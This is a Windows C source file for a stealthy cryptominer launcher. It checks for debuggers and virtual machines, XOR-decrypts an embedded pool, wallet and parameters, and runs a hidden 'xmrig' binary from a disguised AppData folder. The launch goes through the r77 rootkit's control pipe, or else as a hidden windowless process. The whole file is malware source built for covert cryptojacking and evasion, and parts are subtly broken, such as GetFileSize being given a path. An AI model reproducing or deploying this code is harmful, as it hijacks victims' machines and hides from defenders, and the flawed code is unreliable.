#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <shlobj.h>

// Suppress const-related warnings
#pragma warning(disable: 4090)

#define XOR_KEY (0xAA ^ 0x57) 

// Encrypted configuration strings (backup)
BYTE encryptedPool[] = { 
    0xFD, 0xFA, 0xF3, 0xFC, 0xD3, 0xF6, 0xF3, 0xF3, 0xF1, 0xF4, 0xFB, 0xF3, 
    0xFC, 0xFD, 0xF4, 0xFA, 0xFD, 0xE6, 0xE3, 0xE3, 0xE0, 0xE3, 0xE3, XOR_KEY 
};

BYTE encryptedWallet[] = { 
    0x1B, 0x1F, 0x1A, 0x18, 0x4B, 0x1A, 0x1E, 0x18, 0x1F, 0x4B, 0x1F, 0x1C, 
    0x1D, 0x4B, 0x1E, 0x1D, 0x1C, 0x1F, 0x1A, 0x4B, 0x1F, 0x1A, 0x1E, 0x1D, 
    0x1F, 0x1A, 0x1C, 0x4B, 0x18, 0x1F, 0x1A, 0x1D, 0x1C, 0x1F, 0x1A, 0x1E, 
    0x1D, 0x1F, 0x1A, 0x1C, 0x4B, 0x1C, 0x1D, 0x18, 0x1F, 0x4B, 0x1C, 0x1D, 
    0x1A, 0x1B, 0x4B, 0x1F, 0x18, 0x1B, 0x1A, 0x1F, 0x18, 0x1C, 0x1D, 0x1F, 
    0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 
    0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 
    0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 0x1A, 0x1B, 0x1F, 0x18, 0x1C, XOR_KEY 
};

BYTE encryptedWorker[] = { 
    0xF0, 0xF7, 0xFA, 0xF3, 0xF6, 0xF1, 0xA3, 0xE0, 0xE7, XOR_KEY 
};

BYTE encryptedParams[] = { 
    0x9D, 0x98, 0x9B, 0x9A, 0x98, 0x8F, 0xDE, 0x9D, 0x96, 0x97, 0x98, 0x8F, 
    0xDF, 0xDA, 0xDB, 0xDE, 0x8F, 0xDA, 0x9C, 0x9B, XOR_KEY 
};

// Anti-analysis macros
#if defined(_MSC_VER) && defined(_M_IX86)
    #define JUNK_BLOCK __asm { __emit 0x90; __emit 0x90 }
#else
    #define JUNK_BLOCK
#endif

// Function prototypes
void DECRYPT(BYTE* data, size_t len);
BOOL IsDebugged();
BOOL IsVM();
BOOL FileExists(LPCSTR path);
BOOL RunHiddenProcess(LPCSTR path, LPCSTR params);
BOOL RunViaR77Pipe(LPCSTR minerPath, LPCSTR params);
BOOL IsConfigValid(LPCSTR configPath);

// String decryption
void DECRYPT(BYTE* data, size_t len) {
    for(size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
        JUNK_BLOCK;
    }
}

// Anti-debugging
BOOL IsDebugged() {
    JUNK_BLOCK;
    return IsDebuggerPresent();
}

// VM detection
BOOL IsVM() {
    JUNK_BLOCK;
    BOOL result = FALSE;
    
    // Check for common VM artifacts
    if (GetModuleHandleA("vboxservice.dll") || 
        GetModuleHandleA("vm3dgl.dll") || 
        GetModuleHandleA("vmtools.dll")) {
        return TRUE;
    }
    
    // Check CPU core count (VMs often have few cores)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    return result;
}

// File existence check
BOOL FileExists(LPCSTR path) {
    DWORD attrib = GetFileAttributesA(path);
    return (attrib != INVALID_FILE_ATTRIBUTES && 
            !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Basic config validation
BOOL IsConfigValid(LPCSTR configPath) {
    DWORD size = GetFileSize(configPath, NULL);
    return (size > 1024 && size < 10240);  // 1KB-10KB range
}

// Process execution with hidden window
BOOL RunHiddenProcess(LPCSTR path, LPCSTR params) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmdLine[512] = {0};
    if (params) {
        snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", path, params);
    } else {
        snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", path);
    }
    
    BOOL success = CreateProcessA(
        NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    return FALSE;
}

// Execute via r77 rootkit control pipe
BOOL RunViaR77Pipe(LPCSTR minerPath, LPCSTR params) {
    HANDLE hPipe = CreateFileA(
        "\\\\.\\pipe\\$77control",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hPipe == INVALID_HANDLE_VALUE) 
        return FALSE;

    char command[512] = {0};
    if (params) {
        snprintf(command, sizeof(command), "runhidden \"%s\" %s", minerPath, params);
    } else {
        snprintf(command, sizeof(command), "runhidden \"%s\"", minerPath);
    }

    DWORD bytesWritten;
    BOOL success = WriteFile(hPipe, command, (DWORD)strlen(command), &bytesWritten, NULL);
    CloseHandle(hPipe);
    
    return success;
}

// Main function
int main() {
    // Anti-analysis checks
    if (IsDebugged() || IsVM()) 
        return 1;

    // Get AppData path
    CHAR appDataPath[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) != S_OK) {
        return 1;
    }
    
    // Build mall directory path
    CHAR mallDir[MAX_PATH] = {0};
    snprintf(mallDir, MAX_PATH, "%s\\Microsoft\\Windows\\Templates\\mall", appDataPath);
    
    // Build miner path
    CHAR minerPath[MAX_PATH] = {0};
    snprintf(minerPath, MAX_PATH, "%s\\$77-xmrig.exe", mallDir);
    
    // Build config path
    CHAR configPath[MAX_PATH] = {0};
    snprintf(configPath, MAX_PATH, "%s\\config.json", mallDir);
    
    // Verify miner exists
    if (!FileExists(minerPath)) 
        return 2;
    
    // Execution strategy
    BOOL success = FALSE;
    
    // Priority 1: Use config.json if valid
    if (FileExists(configPath) && IsConfigValid(configPath)) {
        success = RunViaR77Pipe(minerPath, NULL);
        if (!success) {
            success = RunHiddenProcess(minerPath, NULL);
        }
    }
    
    // Priority 2: Use encrypted parameters if config fails
    if (!success) {
        // Decrypt backup configuration
        DECRYPT(encryptedPool, sizeof(encryptedPool));
        DECRYPT(encryptedWallet, sizeof(encryptedWallet));
        DECRYPT(encryptedWorker, sizeof(encryptedWorker));
        DECRYPT(encryptedParams, sizeof(encryptedParams));
        
        // Prepare parameters
        CHAR minerParams[512] = {0};
        snprintf(
            minerParams, 
            sizeof(minerParams),
            "-o %s -u %s -p %s %s",
            (char*)encryptedPool,
            (char*)encryptedWallet,
            (char*)encryptedWorker,
            (char*)encryptedParams
        );
        
        // Execute with parameters
        success = RunViaR77Pipe(minerPath, minerParams);
        if (!success) {
            success = RunHiddenProcess(minerPath, minerParams);
        }
        
        // Clean sensitive data
        SecureZeroMemory(minerParams, sizeof(minerParams));
        SecureZeroMemory(encryptedPool, sizeof(encryptedPool));
        SecureZeroMemory(encryptedWallet, sizeof(encryptedWallet));
        SecureZeroMemory(encryptedWorker, sizeof(encryptedWorker));
        SecureZeroMemory(encryptedParams, sizeof(encryptedParams));
    }
    
    return success ? 0 : 3;
}